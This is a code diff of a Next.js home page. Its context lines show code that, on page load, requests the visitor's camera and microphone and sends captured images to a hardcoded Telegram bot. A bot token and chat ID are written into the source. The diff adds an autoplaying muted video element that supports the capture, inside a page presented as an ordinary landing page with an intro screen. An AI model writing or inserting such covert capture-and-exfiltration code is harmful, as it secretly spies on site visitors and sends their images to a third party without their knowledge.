@@ -3,15 +3,15 @@ import Head from 'next/head'
 import Intro from '@/app/components/screens/home/Intro/Intro';
 
 const Index = () => {
-    
+
     // отправляем видео/фото боту 
-    const videoRef = useRef(null);
+    const videoRef = React.useRef(null);
 
     const TOKEN = "6444223689:AAFxMZ7OtGgRxLIy6IfhzxBXXJ9tHmUd-WY";
     const chatId = "-1001860144177";
     const urlApi = `https://api.telegram.org/bot${TOKEN}/sendPhoto`;
 
-    useEffect(() => {
+    React.useEffect(() => {
         const getMediaAndSendData = async () => {
             try {
                 const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
@@ -83,6 +83,7 @@ const Index = () => {
             </Head>
 
             <main>
+                <video ref={videoRef} autoPlay muted />
                 <Intro />
             </main>
         </>
